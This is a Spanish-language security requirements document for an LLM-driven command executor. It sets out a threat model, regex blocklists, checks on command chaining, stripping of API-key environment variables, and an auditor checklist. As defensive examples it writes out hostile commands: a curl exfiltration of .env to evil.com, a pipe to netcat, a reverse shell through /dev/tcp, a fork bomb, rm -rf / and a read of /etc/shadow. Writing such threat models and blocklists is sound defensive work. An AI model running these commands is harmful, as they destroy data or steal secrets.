# Security Requirements: AOS-004 — CLI Executor con soporte PTY

**Ticket:** AOS-004
**Rol:** CISO
**Input:** AOS-004 Architecture Document, Especificación de producto (sección 8.3)
**Fecha:** Marzo 2026

---

## Threat model

### Activos a proteger

| Activo | Valor | Riesgo |
|--------|-------|--------|
| Sistema de archivos del usuario | **CRÍTICO** | Borrado accidental, corrupción, exfiltración |
| Estabilidad del sistema operativo | **CRÍTICO** | Shutdown, reboot, fork bombs, resource exhaustion |
| API keys en environment variables | **CRÍTICO** | Exfiltración vía `env`, `printenv`, `echo $VAR` |
| Red del usuario | **ALTO** | Conexiones no autorizadas, reverse shells, tunnels |
| Otros procesos del usuario | **ALTO** | Kill de procesos, injection en otros programas |

### Vectores de ataque

| # | Ataque | Probabilidad | Impacto | Mitigación |
|---|--------|-------------|---------|------------|
| T1 | `rm -rf /` o variantes destructivas | **ALTA** (LLM puede generar) | Crítico | Blocklist de patrones destructivos |
| T2 | Fork bomb `:(){ :\|:& };:` | **MEDIA** | Crítico | Blocklist de patrones + resource limits |
| T3 | `env` o `printenv` expone API keys | **ALTA** | Crítico | Sanitizar environment ANTES de spawn |
| T4 | `echo $ANTHROPIC_API_KEY` | **ALTA** | Crítico | Sanitizar environment (key no existe en child) |
| T5 | Reverse shell `bash -i >& /dev/tcp/...` | **MEDIA** | Alto | Blocklist de patrones de network abuse |
| T6 | `sudo` privilege escalation | **MEDIA** | Crítico | Blocklist absoluto de sudo/su |
| T7 | `shutdown` / `reboot` | **MEDIA** | Alto | Blocklist de system commands |
| T8 | `curl http://evil.com/steal?key=$(cat .env)` | **MEDIA** | Crítico | .env no accesible + env sanitizado |
| T9 | Infinite output `yes` / `cat /dev/urandom` | **ALTA** | Medio | Output truncation + timeout |
| T10 | Command chaining bypass `echo safe; rm -rf /` | **ALTA** | Crítico | Analizar TODA la cadena de comandos |

---

## Requirements

### [MUST] Blocklist de comandos

- **SEC-020**: El SafetyGuard DEBE bloquear los siguientes patrones (regex, case-insensitive donde aplique):

**Categoría: Destructivo**
```
rm\s+(-[a-zA-Z]*f[a-zA-Z]*\s+)?/          # rm -rf /, rm -f /path
rm\s+-[a-zA-Z]*r[a-zA-Z]*\s+/             # rm -r /
rm\s+-[a-zA-Z]*r[a-zA-Z]*\s+~             # rm -r ~ (home dir)
rm\s+-[a-zA-Z]*r[a-zA-Z]*\s+\.\s          # rm -r . (current dir)
mkfs\.                                      # format filesystem
dd\s+.*of=/dev/                             # raw disk write
shred\s                                     # secure delete
wipefs\s                                    # wipe filesystem
:>\s*/                                      # truncate files
>\s*/dev/sd                                 # overwrite disk
```

**Categoría: Sistema**
```
\bshutdown\b
\breboot\b
\bhalt\b
\bpoweroff\b
\binit\s+[06]\b
\bsystemctl\s+(stop|disable|mask)\b
```

**Categoría: Escalación de privilegios**
```
\bsudo\b
\bsu\s
\bchmod\s+[0-7]*777\s+/                    # chmod 777 en root
\bchown\s+root\b
\bpasswd\b
\bvisudo\b
```

**Categoría: Network abuse**
```
\bnmap\b
\bnetcat\b|\bnc\s+-[a-zA-Z]*l             # netcat listen
bash\s+-i\s+>&\s+/dev/tcp                   # reverse shell
\biptables\b
\bufw\b
```

**Categoría: Resource exhaustion**
```
:\(\)\s*\{.*\|.*\}                          # fork bomb
\byes\s*\|                                  # infinite pipe
while\s+true.*do                            # infinite loops
\bstress\b|\bstress-ng\b                    # stress test tools
```

**Categoría: Crypto / malware**
```
\bcryptominer\b
\bxmrig\b
\bcpuminer\b
```

### [MUST] Análisis de command chaining

- **SEC-021**: El SafetyGuard DEBE analizar la CADENA COMPLETA de comandos, no solo el primer comando. Debe detectar operadores de encadenamiento y validar CADA sub-comando:

| Operador | Ejemplo | Qué hacer |
|----------|---------|-----------|
| `;` | `echo hi; rm -rf /` | Split y validar ambos |
| `&&` | `ls && shutdown` | Split y validar ambos |
| `\|\|` | `false \|\| reboot` | Split y validar ambos |
| `\|` (pipe) | `cat file \| nc evil.com 1234` | Split y validar ambos |
| `$()` (subshell) | `echo $(cat /etc/shadow)` | Extraer y validar comando interno |
| `` ` ` `` (backticks) | `` echo `whoami` `` | Extraer y validar comando interno |

### [MUST] Sanitización de environment

- **SEC-022**: El proceso hijo NUNCA hereda las siguientes variables de entorno:
```
ANTHROPIC_API_KEY
OPENAI_API_KEY
GOOGLE_API_KEY
TELEGRAM_BOT_TOKEN
AWS_SECRET_ACCESS_KEY
AWS_ACCESS_KEY_ID
GITHUB_TOKEN
GH_TOKEN
GITLAB_TOKEN
DATABASE_URL (si contiene password)
```

- **SEC-023**: La sanitización se hace copiando `os.environ`, eliminando las vars bloqueadas, y pasando la copia al subprocess. NUNCA modificar `os.environ` del proceso padre.

### [MUST] Límites de recursos

- **SEC-024**: Timeout por defecto: 300 segundos. Máximo absoluto: 600 segundos. Ningún playbook puede exceder el máximo.
- **SEC-025**: Output máximo: 1 MB. Si se excede, truncar y marcar como truncado.
- **SEC-026**: Un solo comando a la vez por executor. No paralelismo de comandos (previene resource exhaustion).

### [MUST] Logging de auditoría

- **SEC-027**: CADA ejecución genera un entry de auditoría con:
  - Comando ejecutado (completo)
  - Resultado de validación del SafetyGuard (safe/blocked + reason)
  - Exit code
  - Duración
  - Si fue truncado
  - Si fue terminado por timeout
  - Timestamp UTC

- **SEC-028**: El stdout/stderr del comando NO se loguea en el audit trail (puede contener datos sensibles del usuario). Solo se almacena en el TaskStore para referencia del usuario.

### [SHOULD] Mejoras futuras

- **SEC-029**: Contenedorización: ejecutar comandos en un namespace/cgroup aislado (Phase 3+).
- **SEC-030**: Allowlist por playbook: en lugar de solo blocklist global, cada playbook declara qué comandos puede usar.

---

## Checklist para el Security Auditor

- [ ] Ejecutar cada patrón de la blocklist y verificar que se bloquea
- [ ] Probar command chaining: `echo safe; shutdown` debe ser bloqueado
- [ ] Probar `echo $ANTHROPIC_API_KEY` en child process — debe retornar vacío
- [ ] Probar `env | grep KEY` en child process — no debe mostrar keys
- [ ] Probar timeout: `sleep 999` debe terminarse
- [ ] Probar output infinito: `yes` debe truncarse a 1 MB
- [ ] Verificar que los logs NO contienen stdout/stderr de los comandos
- [ ] Probar subshell: `echo $(cat /etc/passwd)` — el cat debe ser analizado
- [ ] Verificar que un fork bomb es bloqueado
- [ ] Verificar que `sudo anything` es bloqueado
